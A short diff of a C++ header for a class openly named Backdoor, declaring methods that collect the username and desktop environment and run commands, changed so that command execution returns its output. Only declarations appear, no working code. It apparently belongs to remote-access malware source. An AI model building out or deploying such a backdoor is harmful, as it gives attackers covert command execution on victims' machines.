@@ -22,7 +22,7 @@ public:
     void get_username();
     void get_desktop_enviroment();
 
-    void execute_command(const char *);
+    char * execute_command(const char *);
 
     Backdoor(int, Communication *, bool, char *);
 
